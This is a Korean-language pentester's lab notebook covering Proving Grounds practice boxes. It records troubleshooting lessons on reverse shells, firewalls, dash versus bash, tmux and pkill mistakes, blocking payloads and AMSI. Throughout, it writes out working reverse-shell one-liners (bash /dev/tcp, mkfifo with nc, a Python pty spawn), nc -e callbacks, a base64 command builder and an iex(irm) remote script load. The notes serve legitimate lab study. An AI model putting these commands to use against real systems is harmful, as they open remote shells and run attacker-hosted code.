`[가정]` — 「유령 wget 이 리스너를 먼저 소모해서 3회 실패」라는 인과는 완전히 입증되지 않았음. **그 시점의 443 리스너 로그가 남아 있지 않음.** 다만 (a) 443 으로 재배달되는 wget 이 실재했고 (b) `nc -lvnp` 는 `-k` 없이 연결 하나에 종료되며 (c) 스크립트가 동일한데 포트만 바꾸니 즉시 붙었다 — 셋이 같은 방향을 가리킴.
→ 두 가지가 남음. ① **확인용 명령이라도 부작용을 남기지 말 것** — 이 부류는 한 번 보낸 명령이 몇 분 뒤 재실행됨. ② **리스너가 안 붙으면 포트를 갈아보는 것이 방화벽을 의심하는 것보다 쌈.** ([[Detection]] 의 「제3 호스트가 443 리스너를 먼저 물었다」와 같은 계층 — 원인은 방화벽이 아니라 리스너 점유였음)

**⛔ `Connection refused` 는 나쁜 소식이 아니라 «좋은» 소식임 — 차단은 refused 가 아니라 «무응답 타임아웃»으로 나타남.** refused 는 패킷이 목적지까지 갔다는 뜻이고 RST 를 보낸 것은 리스너가 없는 내 Kali 임.
[[PlanetExpress]] — `passthru` 로 돌린 다중 포트 아웃바운드 테스트 루프에서 **stdout(블록 버퍼링)·stderr(비버퍼링)의 줄 순서가 뒤섞여** `RESULT 443 FAIL` 바로 뒤에 `Connection refused` 가 붙어 보였음. 443 이 refuse 된 것으로 오독 → 「80 도 refuse 되니 아웃바운드가 전부 막혔다」는 결론으로 **8분** 소모.

| 포트 | 실제로 일어난 일 | 타겟 방화벽 |
|---|---|---|
| 443 | 5초 타임아웃, 에러 메시지 없음 | OUTPUT DROP |
| 80 | 즉시 `Connection refused` | **ACCEPT** (그 시점 Kali 쪽에 리스너가 없어 RST) |
| 53 | 즉시 `Connection refused` | **ACCEPT** (위와 같음) |
| 4444 | 5초 타임아웃 | OUTPUT DROP |

— 방화벽 열은 root 획득 후 `root_enum_fw.log`(4197B)로 확정한 실측임: `-A OUTPUT -j DROP` + 53/80/9000 만 ACCEPT, DROP 카운터 `131K packets`. **추론이 아니라 규칙 원문임.**
→ **진단 로그를 한 스트림으로 볼 거면 `stdbuf -oL` 로 버퍼링을 맞추거나 stdout/stderr 를 따로 파일에 받을 것.** 줄 순서가 뒤섞이면 인과가 뒤집혀 읽힘.

**⚠️ 캡처 도구가 조용하면 「트래픽이 없다」가 아니라 「도구가 살아 있나」부터 의심할 것.** 같은 박스의 `tcpdump_connectback.log` 는 전문이 한 줄이었음:
```text
tcpdump: can't parse filter expression: syntax error
```
「아무 패킷도 안 잡혔다」로 읽었으나 실제로는 **tcpdump 가 뜨지도 않았음.** 백그라운드로 띄워 그 한 줄을 놓친 것. `[가정]` 「처음 필터가 gobuster 트래픽의 SYN-ACK 를 잔뜩 잡아서 헷갈렸다」는 회상이 남아 있으나 **뒷받침하는 캡처 산출물은 없음**(tmux 스크롤백 소멸).
→ **띄운 직후 자기 자신에게 `ping -c1` 한 방으로 캡처가 도는지 확인하는 습관.** `src host` 로 좁혀 SYN-ACK 를 빼는 형태(Kali 에서 파싱 확인함):
```bash
sudo tcpdump -i tun0 -n 'src host <타겟> and tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'
```
→ 막판에 80 리스너로 재시도해 실측으로 닫았음(`try14_revshell80.log` + `shell80.log`). **「막혔다」는 판정은 반대 실험으로 확인하기 전까지 가설임.**

**⛔ 익스플로잇 스크립트가 「리스너를 켜고 엔터」를 요구하면 «정말로» 먼저 켤 것 — 한 발을 날림.** [[pyLoader]] 의 `CVE-2023-0297.sh` 는 `read -p "Run nc -lvnp ${LPORT}, press enter to continue"` 에서 멈춤. 여기서 엔터를 먼저 누르면 **페이로드가 즉시 발사**되고, 리스너가 없으면 타겟의 `bash -i >& /dev/tcp/...` 가 connection refused 로 즉사함. `os.system()` 은 동기 호출이라 실패해도 조용히 끝나 **화면에 아무 에러도 안 나옴** — 「안 붙었다」만 남고 원인이 안 보임.

**리버스셸 대안 순서 — 타겟 언어를 이미 알고 있으면 그 언어가 1순위임.**
```bash
# 1순위 — bash
bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
# 2순위 — mkfifo (nc가 -e 없이 빌드됐어도 동작)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc LHOST LPORT >/tmp/f
# 3순위 — 파이썬
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```
⚠️ **`/dev/tcp` 는 bash 전용이고 컴파일 옵션으로 꺼져 있을 수 있음** — `--disable-net-redirections` 로 빌드된 bash(일부 배포판·컨테이너)에는 존재하지 않음.
→ [[pyLoader]] 는 pyLoad 가 파이썬 앱이라 **3순위가 가장 확실했음.** 이미 `pyimport os` 로 파이썬 «안»에 있었으므로 `pty` 까지 바로 써서 **TTY 를 갖춘 셸을 한 방에** 얻을 수 있었음(실제로는 bash 판을 써서 `no job control` 셸을 받았음).
→ **리버스셸이 즉시 끊기면** `os.system()` 부모 프로세스 종료에 딸려 간 것. `nohup`·`setsid` 로 분리하거나 `bash -c '... &'`(A-32).

**dash 에서 실패하는 «층이 둘»임 — 이 구분이 디버깅에서 갈림.** Kali 에서 직접 때린 것([[Crane]]):
```text
$ /bin/sh -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1'
/bin/sh: 1: Syntax error: Bad fd number          (rc=2)

$ dash -c 'echo hi > /dev/tcp/127.0.0.1/9'
dash: 1: cannot create /dev/tcp/127.0.0.1/9: Directory nonexistent   (rc=2)
```

| 층 | 무엇이 죽는가 | 증상 |
|---|---|---|
| ① 문법 파싱 | dash 에서 `>&` 는 fd 복제 전용이라 `/dev/tcp/...` 같은 파일명을 못 받음 | `Syntax error: Bad fd number` — **`/dev/tcp` 에 도달조차 못 함** |
| ② 가상 장치 부재 | `>` 하나로 바꿔 문법을 통과시켜도 dash 에는 `/dev/tcp` 가상 장치 자체가 없음(bash 가 리다이렉션을 가로채 소켓을 여는 «기능»이지 실제 파일이 아님) | `cannot create /dev/tcp/...: Directory nonexistent` |

결론은 같음 — 마지막 파이프가 반드시 **`| bash`** 여야 함. PHP `system()`·Lua `os.execute` 가 내부적으로 `/bin/sh -c` 를 쓰므로 그 한 겹이 없으면 셸이 안 붙음.
→ **에러 문구는 기억으로 쓰지 말고 한 번 때려보고 적을 것.** 문구가 다르면 검색어가 달라짐.

⚠️ **`{echo,X}|{base64,-d}|bash` 형 brace expansion 도 «bash 전용»임 — `/bin/sh` 가 dash 면 조용히 죽음.** 공백 없이 명령을 짜는 관용구로 널리 퍼져 있으나, 웹 RCE 의 sink 가 `IO.popen`·`system()`·`shell_exec` 이면 실제 실행 셸은 `/bin/sh`(Debian·Ubuntu 계열에서 dash)임. [[RubyDome]] 2차 시도(`rev.py`, 17:52:08)가 정확히 이 형태였음:
```python
cmd = 'bash -c {echo,%s}|{base64,-d}|bash' % b64   # avoid spaces/quotes
```
— 출처: `~/PG/RubyDome/rev.py`. Kali dash 로 재현:
```text
$ /bin/sh -c "bash -c {echo,aGVsbG8=}|{base64,-d}|bash"
/bin/sh: 1: {base64,-d}: not found
```
`[가정]` 타겟도 Ubuntu 22.04(`OpenSSH 8.9p1 Ubuntu 3ubuntu0.1`)라 `/bin/sh` → dash 로 봄. **공백 회피가 필요하면 `${IFS}` 를 쓸 것** — dash 에도 있음.

`[가정]` **Windows 타겟에서도 같은 포트 교체 흔적이 있음.** [[Squid]] — 산출물 mtime 순서가 `revgen.py`(LHOST:PORT=…:**443**, 18:32) → FullPowers 다운로드(18:36) → `revgen4444.py`(…:**4444**, 18:38)이고 최종 성공 셸이 4444 임. 443 시도의 성공·실패 로그 자체는 노트·Kali 어디에도 없어 **「왜 바꿨는지」는 mtime 순서로만 추정 가능함**(직접 관측 아님).
→ 위의 「계층별로 분리하라」와 같은 요점 — **포트를 바꿀 때마다 그 시도의 결과를 파일로 남기지 않으면 다음에 같은 판단을 처음부터 다시 하게 됨**(A-63).

**⛔ 그 전에 — 「리버스여야 하는가」부터.** 타겟 인바운드가 열려 있으면 **bind 셸이 더 간단함**(리스너 관리·아웃바운드 제약이 없음).

| | `shell_bind_tcp` | `shell_reverse_tcp` |
|---|---|---|
| 누가 listen | 타겟 | 공격자(Kali) |
| 누가 connect | 공격자 | 타겟 |
| `LHOST` | **없음(무의미)** | 필수 — Kali 의 tun0 IP |
| `LPORT` | **타겟이 열 포트** | Kali 리스너 포트 |
| 공격자 쪽 준비 | 없음. 익스 후 `nc <타겟> <LPORT>` | 먼저 `nc -lvnp <LPORT>` |
| 언제 쓰나 | 타겟 인바운드가 열려 있을 때 | 타겟 아웃바운드가 열려 있을 때(더 흔함) |

[[Kevin]] 실측 — `Not shown: 65523 closed tcp ports (reset)` 인 타겟이었고 `shell_bind_tcp` 가 연 1234 에 곧바로 붙었음. 반대로 [[Twiggy]] 는 전 포트가 `filtered` 였고 리버스셸도 실패했음.

⚠️ **다만 「RST 가 돌아오니 방화벽이 없다」로 읽지 말 것 — A-1-17 이 그것을 반증함.** RST 에서 확정되는 것은 「묵살형 인라인 차단이 없다」까지이고, `REJECT --reject-with tcp-reset` 도 RST 를 돌려줌. 즉 **RST 는 bind 셸의 «필요조건»일 뿐 보장이 아님** — 새로 연 고번호 포트에 인바운드가 도달하는지는 실제로 붙여봐야 알 수 있음. 둘 다 안 되면 셸을 포기하고 파일 쓰기·스케줄 작업·자격증명 탈취로 전환할 것.

⚠️ **bind 페이로드에 `LHOST` 를 줘도 msfvenom 은 경고하지 않음** — datastore 에 넣기만 하고 셸코드가 참조하지 않음(B-8-10).
⚠️ **`EXITFUNC=thread` 를 쓸 것.** `process` 면 취약 서비스 프로세스가 죽어 **재익스플로잇이 불가능해짐** — 한 번의 실수로 박스를 리버트하게 되는 전형적 원인임. `seh` 는 예외 경로로 복귀.


**PHP 웹셸에서 `/dev/tcp` 를 쓰지 말 것 — 두 이유가 겹침.** ⑴ `system()` 은 `/bin/sh` 로 실행되는데 Debian 의 `/bin/sh` 는 **dash** 이고 dash 에는 `/dev/tcp` 가상 파일이 없음 ⑵ Debian 기본 `netcat-openbsd` 에는 **`-e` 가 컴파일돼 있지 않음**(백도어 방지). 그래서 `mkfifo` 형이 가장 범용적이고, bash 를 쓸 때는 **절대 경로로 명시 호출**해야 함.
⚠️ **`rm /tmp/f` 를 빠뜨리지 말 것** — 재시도 시 FIFO 가 이미 있으면 `mkfifo` 가 `File exists` 로 실패함.
⚠️ **`/usr/bin/bash` 냐 `/bin/bash` 냐** — Debian 11 은 usr-merge 라 `/bin` 이 `/usr/bin` 심볼릭 링크이므로 둘 다 있음. **[가정]** usr-merge 이전 시스템(Debian 9 이하 등)이면 `/usr/bin/bash` 가 없어 **조용히 실패**함.


**PoC 가 리스너를 «자기가» 포크하면 점검 항목이 하나 늘어남.**
[[Flu]] — 이 박스는 1270 포트로 한 번에 붙었으므로 아래는 **관측된 문제가 아니라 점검 순서**임:
1. **`--lhost` 가 `tun0` IP 인가** — VPN IP 는 세션마다 바뀜. `ip -br a` 로 확인([[Clue]] 에서 실제로 이걸로 시간을 태웠음)
2. **포트 충돌** — `through_the_wire.py` 는 `--fork-nc` 를 끌 수 없어(`action="store_true"` + `default=True`) **항상 1270 을 잡음.** 내 리스너가 이미 있으면 충돌함
3. **아웃바운드 필터** — 1270 같은 비표준 포트가 막히면 `--lport 443`/`80` 으로 내림
4. **`bash` 부재** — 페이로드가 `bash -c` 를 씀. 대상에 bash 가 없으면 실패함. Flu 는 `/etc/passwd` 의 `root:...:/bin/bash` 로 존재가 확인됐음


**한 SSH 호출에서 tmux 세션을 여러 개 만들면 「세션 이름 ↔ 포트」 매핑이 뒤바뀜 — 그리고 겉으로는 완벽히 정상임.** [[Algernon]]:
```bash
# ✗ 이렇게 했음 — 하지 말 것
ssh kali@10.44.44.128 "tmux new-session -d -s alg 'sudo nc -lvnp 80'; \
                       tmux new-session -d -s alg443 'sudo nc -lvnp 443'; \
                       tmux new-session -d -s alg53 'sudo nc -lvnp 53'"
```
`alg` 세션이 80 이 아니라 53 을 리스닝하게 됐음. **`ss -lntp` 에는 세 포트가 전부 LISTEN 으로 보여** 「포트가 열려 있는가」에는 아무 문제가 없었고, 틀린 것은 「어느 세션 이름이 어느 포트인가」뿐이었음. 그래서 발사 후 `alg` 페인을 보며 **「아무것도 안 들어왔다 → 실패했다」로 오판**함. 첫 발사가 헛돈 원인일 가능성이 큼 `[가정]` — 셸이 실제로 다른 페인에 떨어졌는지는 확인하지 못했음.
원인은 `tmux new-session -d` 가 서버 기동·세션 등록을 비동기로 처리하는데 셋을 밀어 넣어 등록 순서와 명령 실행 순서가 어긋난 것 `[가정]`.
```bash
# ✓ 세션 하나 = SSH 호출 하나. 그리고 즉시 검증
ssh kali@10.44.44.128 "tmux new-session -d -s alg80 'sudo nc -lvnp 80'"
ssh kali@10.44.44.128 "tmux ls"
ssh kali@10.44.44.128 "ss -lntp | grep ':80 '"
```
→ **`ss -lntp` 의 LISTEN 은 「포트가 열렸다」만 증명하고 「내가 보는 페인이 그 포트다」는 증명하지 않음.** 검증하려면 `ss` 의 PID 를 tmux 페인 PID 와 대조하거나, **애초에 하나만 만들어 애매함을 없앨 것.**
→ 일반화: **리스너·터널·포트포워딩·프록시는 전부 이 함정을 가짐.** 「만들었다」와 「의도한 대로 붙어 있다」는 다른 명제이고, 검증 비용은 몇 초, 오판 비용은 수십 분임.

**LPORT 를 80/443 으로 고르는 세 이유 (특권 포트 `sudo` 주의 포함).** [[Algernon]] 은 기본값 4444 를 안 씀 — ①방화벽이 아웃바운드를 제한해도 80/443 은 열어두는 것이 관례이고 4444 는 IDS 시그니처에도 걸림 ②이 익스플로잇은 실패를 알려주지 않아 「페이로드가 안 터진 것」과 「터졌는데 아웃바운드가 막힌 것」을 구분할 수 없으므로 **아웃바운드 변수부터 제거하고 시작** ③실패 시 원인 후보가 여러 개라 첫 발사에서 변수 하나를 미리 없애는 쪽이 저렴.
⚠️ **1024 미만은 특권 포트라 리스너에 `sudo` 가 필요함.** 빠뜨리면 `Permission denied` 로 안 뜨는데 **tmux 안에서 돌리면 그 에러를 못 보고 「리스닝 중」이라고 착각함.**

**⚠️ LHOST 가 낡은 것과 «목적지 IP 를 타겟 자신으로 적는 것»은 다른 실수임.** [[Clue]] `~/.zsh_history` 원문(행번호 순 = 시간순):
```text
1064: python 49362.py -p 3000 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'   ← ①목적지가 타겟 ②49362 는 명령 실행 도구가 아님
1077: python 47799.py 192.168.115.240 'nc -e /bin/sh 192.168.115.240 3000'           ← 목적지가 타겟
1117: python 47799.py 192.168.178.240 'nc -e /bin/sh 192.168.45.179 3000'            ← 올바른 형태
1119: python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.178.240 3000'         ← 다시 목적지가 타겟
1120: python 47799.py 192.168.178.240 'nc -e /bin/bash 192.168.45.175 3000'          ← lhost 가 «옛» VPN IP
```
⚠️ **올바른 형태(1117)가 틀린 형태(1119·1120)보다 «먼저» 나옴** — 한 번 맞히고 다시 틀린 것이라 「점점 고쳐 나갔다」는 서사가 성립하지 않음. 손이 기억하는 형태로 되돌아가는 것이 이 실수의 본질임.

목적지가 타겟이면 **타겟이 자기 자신에게 접속**하므로 Kali 에는 아무것도 안 오고 리스너는 조용히 기다림 — **egress 차단과 증상이 완전히 같음.**

| 증상 | 원인 |
|---|---|
| 익스플로잇은 인증까지 성공인데 리스너에 아무것도 안 옴 | 목적지 IP 오타 **또는** 아웃바운드 차단 |
| 즉시 연결됐다가 바로 끊김 | 셸 경로가 없음(`/bin/bash` 부재) |
| 아예 인증도 실패 | 비밀번호·포트 문제 |

이 박스는 nmap 이 `Not shown: 65529 filtered` 라 **방화벽을 의심할 근거가 충분했는데 실제 원인은 오타**였음.
→ **오타를 먼저 배제하고 그 다음에 방화벽을 의심할 것.** 순서가 반대면 시간을 크게 태움.
→ 치기 전 3초 점검 — `ip -br a | grep tun0` 로 «지금» VPN IP 를 확인하고, 명령을 읽을 때 `nc -e /bin/sh <여기는 나> <여기는 내 리스너 포트>` 로 **어느 자리가 누구인지 소리 내어 확인**할 것.

#### A-32. 진입점을 내 페이로드로 죽였다

**증상** — 익스플로잇 후 해당 포트가 통째로 무응답(nmap `filtered`, SYN 전부 무응답 = accept 백로그 포화).

**원인** — 블로킹 페이로드. [[Detection]]: `popen('... pty.spawn ...').read()` 가 블로킹이라 flask 요청 스레드를 영구 점유했고, 백로그 50(`harvest_root.txt` LISTEN 섹션 `tcp LISTEN 0 50 0.0.0.0:5000`) 뒤로 accept 가 멈춤. 「요청을 사실상 순차 처리한다」는 이 현상에서의 추론 [가정] — 관측된 사실은 「블로킹 요청 하나 뒤로 accept 가 멈췄다」까지.

⚠️ **1차 시도는 실제로 root pty 를 잡았음. 죽인 것은 «재발사»임.** 443 리스너 실측(출처 `~/PG/Detection/pty_shell_evidence.log` = `listener/shell443.log` 사본):
```text
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.97] 37522
root@detection:/#
```
같은 페이로드를 한 번 더 쏘자 두 번째 `popen(...).read()` 가 반환하지 않아 요청 스레드가 영구 점유되며 앱이 죽음. **셸이 나온 뒤에 같은 페이로드를 다시 발사하지 말 것** — 진입점 하나를 그 한 방으로 잃음.

**예방** — 명령 실행 sink 에서 프로세스를 붙잡지 말 것:
```bash
setsid nohup <cmd> >/dev/null 2>&1 </dev/null &
```
결과는 아웃바운드 콜백으로만 받을 것. SSH 키 심기는 전부 비블로킹이라 가장 안전함.

**⚠️ 페이로드가 아니라 «정찰 부하»로 진입점이 죽을 수도 있음.** [[Flimsy]] — 정리 단계(21:38)에 43500 이 응답을 멈춤. TCP 는 붙는데(`nmap` open) HTTP 응답이 없고, **타겟 안에서 `127.0.0.1:43500` 을 때려도 같았음.** 22·80·3306 과 ping 은 정상이었으므로 네트워크가 아니라 APISIX 프로세스 문제임. 재획득 4회 시도(21:43~21:47) 전부 무응답 — APISIX 가 뻗어 `/pwn1` 라우트 자체가 안 먹음. **파일로 보존하지 못했음**(셸을 잃은 뒤의 확인이라 산출물이 얇음):
```text
--- plain GET / on 43500 ---
http=000 time=12.002099
--- port state ---
PORT      STATE SERVICE         VERSION
9443/tcp  open  tungsten-https?
43500/tcp open  unknown
```
`[가정]` 매분 도는 `run.sh` 가 `nohup etcd &` 와 `apisix start` 를 반복 실행하는 데다 gobuster 41만 요청이 겹쳐 뻗은 것으로 봄. **셸을 잃은 뒤의 추정이고 실측으로 확인하지 못했음.**
**오히려 반대 증거가 하나 있음** — 12:33 에 뜬 `harvest_root.txt` 의 프로세스 목록에는 `etcd` **한 개**와 APISIX nginx 워커 **두 개**뿐임. 12:16 부터 17번 돌았는데도 누적이 안 보임(뒤에 뜬 etcd 는 2379 바인딩에 실패해 바로 죽었을 것). 그러니 「인스턴스 누적」보다 **gobuster 부하** 쪽이 유력하나 **그것도 확인한 것이 아님.**
→ 규율 셋:
- **정리는 셸이 건강할 때 먼저 끝낼 것.** 플래그 확보 직후 순서는 「산출물 저장 → 정리 → 추가 열거」였어야 했음
- **재진입 수단을 하나 확보해 둘 것.** root 를 잡았을 때 `/etc/shadow` 나 `/root/.ssh` 를 챙겼으면 SSH(`PermitRootLogin yes`·`PasswordAuthentication yes`)로 돌아갈 수 있었음. 안 챙겨서 못 돌아갔음(A-65)
- **배경 스캔을 켠 채로 익스플로잇 단계에 들어가지 말 것** — 경로가 확정되면 즉시 끌 것(A-11 · A-18)

**복구** — 인바운드로 타겟 프로세스를 죽일 방법이 없으면 **리버트가 유일한 해소책임.** 데드락 복구에 시간 태우지 말 것. [[Detection]] 실측 복구 시도(전부 실패): Kali 쪽 고아 리스너 kill → 무효(타겟 프로세스와 무관). scapy 로 타겟 고아 소켓에 SYN→challenge ACK→RST 유도해 TCP 소켓 자체는 죽였음(pcap 상 타겟의 `R.` 응답 확인)에도 앱은 미복구 — 타겟 python3 가 stdin EOF 후에도 `master_fd` 를 계속 기다려 살아남은 것으로 판단 [가정]. **타겟 프로세스 상태는 앱이 죽은 뒤라 관측 자체가 불가능**했음.

**코드 주입 계열 공통 — 명령을 짧게 끊고, 최초 확인은 «아웃바운드 콜백»으로 가를 것.**
- 회피 ① 명령을 `curl -m 5` · `shell_exec('cmd 2>&1')` 로 **짧게 끊음**
- 회피 ② 리버스셸은 **fifo + 백그라운드**로 요청 스레드에서 떼어냄
- 최초 실행 확인은 인바운드 응답이 아니라 **아웃바운드 HTTP 콜백**으로 — Kali 에 `sudo python3 -m http.server 80` 을 tmux 로 띄우고 페이로드에 `curl -m 5 http://<LHOST>/hit-<태그>`
- **태그를 후보별로 다르게 주면 「어느 함수가 통했는지」가 한 번에 판정됨** — [[CVE-2023-46818]] 은 `system`·`passthru`·백틱·`shell_exec` 4종을 동시에 확인했음
- 부수 이득 — **아웃바운드 열림 여부가 같이 확정**돼 리버스셸 포트 선택이 쉬워짐

#### A-33. 셸을 내 손으로 죽였다 — 인터랙티브 프롬프트와 `pkill -f`

**불안정한 nc 리버스셸에서 인터랙티브 프롬프트에 `C-c` 를 보내면 셸이 죽음.** [[Fractal]]: pty 승격 직후 `sh harvest.sh` 를 前景 실행했더니 내부 `find /` 가 오래 걸려 pane 이 잠기고 이후 명령이 큐에 쌓였음. 두 번째 셸에서 `sudo -l` 을 치다 `[sudo] password` 프롬프트에 `C-c` 를 보내자 **리버스셸이 끊기며 세션째 사망.**
- `harvest.sh` 는 리다이렉트 후 결과만 회수할 것. **前景 대기 금지**
- 열거는 SSH 로 승격한 뒤가 안정적. [[Fractal]] 의 www-data 열거는 결국 **비대화형 RCE(`rce.py`)** 로 돌려 안정 회수했음

**`pkill -f` 는 «자기 자신»을 죽임.** [[Assignment]]:
```bash
ssh ... jane@target 'sed -i "s/+ 400/+ 1500/" /tmp/.w.sh; pkill -f "sh /tmp/.w.sh"; ...; touch /tmp/marker_a ...'
```
`pkill -f` 는 **명령줄 전체**를 봄. 이 SSH 원격 명령 자체의 cmdline 에 `sh /tmp/.w.sh` 문자열이 들어 있어 **자기 셸이 매칭돼 죽었고**, 전체가 exit 1 로 끊겨 뒤따르던 `touch` 가 실행되지 않았음. 처음엔 원격 문제로 오독함.
→ **PID 로 대체할 것** — `ps -eo pid,args | grep '[.]w.sh'` 로 PID 확인 후 `kill <PID>`.
(이 볼트의 광범위 `pkill` 금지 규율과 같은 뿌리 — 패턴 매칭은 자기 자신과 남을 함께 잡음.)

**tmux `send-keys` 로 `&`·`|` 를 보내면 이스케이프가 깨진다.** [[Internal]] — 증거 명령 `whoami & hostname & ipconfig | findstr IPv4 & …` 를 `send-keys` 로 nc 리버스셸에 보냈더니 `send-keys` 가 `&` 를 `\&` 리터럴로 넘겨(cmd 가 백슬래시를 그대로 받음) 명령이 깨졌고, 파이프(`| findstr`)가 걸린 채 셸이 응답을 멈췄음. 복구하려 `tmux send-keys C-c` 를 보냈더니 **`C-c` 가 원격 셸이 아니라 로컬 `nc` 프로세스를 죽여** tmux 세션째 사라지고 타겟 셸은 `FIN-WAIT-2` 로 끊김.
→ **nc 리버스셸에 `|`·`&` 조합을 던지지 말 것.** 필요하면 한 줄에 하나씩.

**같은 사고가 「원격 hung 명령을 끊으려다」 형태로도 남.** [[Flimsy]] — 정리 단계에서 43500 이 응답을 멈춰 hung `curl` 을 끊으려고 tmux 페인에 `C-c` 를 보냈는데 **그것이 원격 curl 이 아니라 로컬 `nc` 를 죽여** root 셸까지 함께 날아갔음(복구 실패, A-32). 알아챈 방법은 단순함 — 페인에 `id` 를 쳤더니 `uid=1000(kali)` 가 돌아왔음. **프롬프트가 타겟이 아니라 Kali 로 돌아와 있었음.**
→ **hung 명령은 페인을 버리지 말고 «다른 경로»(별도 셸·별도 tmux 세션)로 우회할 것.** 리버스셸 페인의 `C-c` 는 언제나 로컬 `nc` 를 겨냥함.

**비대화형 배치 열거는 프롬프트 하나에 통째로 멈춤.** [[Fowsniff]] — 원격 SSH 로 열거 명령을 한 번에 몰아넣었는데 `sudo -l` 이 비밀번호 프롬프트를 띄우고 멈춤. **뒤의 열거 명령이 하나도 안 돌았고 180초 타임아웃까지 그냥 대기함.** (이 실패 실행의 출력은 파일로 남지 않았음 — 남은 것은 `writeup_notes.txt` 15:02 의 「sudo -l 이 비번 프롬프트로 블로킹 → 180s 타임아웃」 한 줄임.)
- **`sudo -n -l` 을 쓸 것** — `-n` 은 프롬프트를 띄우지 않고 즉시 실패함. ⚠️ 그 실패를 「sudo 없음」으로 읽지는 말 것(A-41)
- 비밀번호를 아는 경우면 `echo '<pw>' | sudo -S -l` 로 stdin 에 먹임. [[Fowsniff]] 는 후자로 넘어갔고 결과는 `may not run sudo` 였음
- ⚠️ `-S` 는 비밀번호를 stdin 에서 읽지만 **프롬프트는 stderr 로 그대로 뿌림.** 원격 pty 출력과 겹치면 로그가 토막나 섞임 — `Sorry, user baksteen may not run sudo on fowsniff.` 가 `So` … `Connection to ... closed.` … ` fowsniff.` 로 갈라져 나왔음(`enum_baksteen.log`). 결론은 안 바뀌지만 나중에 읽을 때 「안 돌았나」 싶어짐. `sudo -n -l 2>/dev/null` 로 stderr 를 버리는 편이 로그가 깨끗함
- **프롬프트를 띄울 수 있는 명령은 전부 같은 취급** — `sudo` · `ssh`(호스트키) · `su` · `passwd` · `apt`. 하나가 멈추면 뒤가 전부 죽음


**`sudo pkill -f 'nc -lvnp'` 한 줄이 tmux 서버를 통째로 죽임 — 무관한 다른 박스의 세션까지.** [[Algernon]] — 잘못 만든 리스너를 정리하려고 패턴 kill 을 썼더니 리스너뿐 아니라 tmux 서버가 내려가, 진행 중이던 nmap 세션과 **완전히 무관한 다른 박스의 작업 세션까지 함께 죽었음.** `pkill -f` 는 전체 커맨드라인에 정규식을 맞추는데 tmux 가 페인 프로세스를 띄울 때의 커맨드라인에도 `nc -lvnp` 문자열이 들어가 tmux 관리 프로세스가 광범위하게 매치된 것 `[가정]`. `sudo` 까지 붙어 소유자 제한도 없었음.
```bash
# ✓ 포트를 정확히 지정해 그 리스너만
sudo fuser -k 80/tcp
# ✓ 또는 PID 를 먼저 확인하고 그것만
ss -lntp | grep ':80 '
sudo kill <PID>
# ✓ tmux 는 세션 «이름»으로만 (다른 세션은 안 건드림)
tmux kill-session -t alg80
```
→ **랩에서는 내 작업만 날아가지만 실무 침투 테스트에서 고객 서버에 치면 사고 보고서를 쓰게 됨.** 패턴으로 죽여야 한다면 먼저 `pgrep -af '<패턴>'` 으로 무엇이 매치되는지 눈으로 볼 것.

#### A-34. 셸이 수 초만 산다 — stdin 을 미리 채워 자동 실행시킨다

**증상** — 커널 인젝션 셸(BOF·커널 RCE)이 연결 직후 수 초 안에 끊김. `tmux send-keys` 로 한 명령씩 왕복하면 라운드트립 지연 사이에 셸이 죽어 명령이 안 들어감.

**해법** — 리스너 stdin 을 `sleep`+`echo` 로 미리 채워 콜백 즉시 명령이 자동 실행되게 함:

```bash
{ sleep 4; echo 'type C:\Users\Administrator\Desktop\proof.txt';
  sleep 4; echo 'whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\...\proof.txt';
  sleep 900; } | sudo nc -lvnp 443 | tee shell_auto.txt
```

[[Internal]] — MS09-050 커널 RCE 셸이 이 유형. 콜백 4초 뒤 플래그가 자동 회수됨(`~/PG/Internal/flag_evidence.txt`). 이 박스에서 셸을 **세 번** 잃었음 — ⓐ `Ctrl-C` 로 로컬 nc 를 죽여서 ⓑ 파이프·`&` 조합에 셸이 hang ⓒ 연결 직후 호스트가 다시 BSOD.

**대책은 「대화형으로 타이핑하지 않는 것」이다.** 셸이 몇 초만 살아도 플래그를 회수함. 시험장에서 불안정한 셸을 만나면 이 패턴을 먼저 떠올릴 것.

#### A-35. AMSI·Defender 가 페이로드를 조용히(또는 요란하게) 막는다

**⑴ 열거 스크립트가 «파싱 전에» 통째로 차단된다.** PowerShell 열거 프레임워크(PrivescCheck·PowerUp 류)를 `iex(irm ...)` 로 올리면 그 자리에서:
```powershell
PS C:\WINDOWS\system32> iex : At line:1 char:1
+ #Requires -Version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
At line:1 char:1
+ iex(irm http://192.168.45.207/pc.ps1)
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
```
— 출처: `~/PG/Mice/shell443.log:941-949`

**읽는 법** — 분류가 `ParserError` 임. **AMSI 는 스크립트를 파싱하기도 전에 통째로 막음.** 따라서 「스크립트 안쪽 어디가 걸렸나」를 찾는 것은 의미가 없음.

⚠️ **「전달 경로만 바꾸기」는 통하지 않음.** [[Mice]] 는 인라인 `iex` 를 `rpc.ps1`(`iex(irm .../pc.ps1)` 을 담은 별도 스크립트)로 감싸 던졌는데 **같은 곳에서 같은 메시지로 막힘**(`www/rpc.ps1` · `shell443.log:944-960`). 판정 대상은 전달 방식이 아니라 **내용**임. 결과적으로 `Invoke-PrivescCheck` 은 끝내 로드되지 않았고(`CommandNotFoundException`, `shell443.log:952-959`), 그 출력을 읽으려던 후속 스크립트 3개(`get.ps1`·`g2.ps1`·`g3.ps1`)가 전부 존재하지 않는 `pc.out` 을 읽는 헛수고가 됨.

**대안 — 대형 프레임워크 대신 «순수 cmdlet 을 묶은 자작 스크립트».** [[Mice]] 의 `harvest.ps1`(16개 섹션)은 차단 없이 완주했음. 시그니처가 있는 공개 도구를 고집하는 것보다 쌈.

